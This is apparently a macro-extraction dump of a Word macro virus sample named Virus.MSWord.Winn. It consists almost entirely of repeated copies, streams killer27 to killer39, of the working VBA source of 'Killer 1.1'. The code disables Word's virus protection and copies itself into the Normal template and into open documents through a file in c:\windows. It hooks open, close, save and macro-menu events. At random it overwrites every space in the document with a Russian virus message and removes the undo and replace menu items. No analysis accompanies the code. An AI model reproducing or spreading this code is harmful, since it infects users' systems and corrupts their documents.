    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer27.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer27'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer28.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer28'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer29.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer29'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer30.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer30'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer31.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer31'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer32.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer33.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer34.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer35.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer35'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer36.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer37.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer37'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer38.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer38'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer39.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer39'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
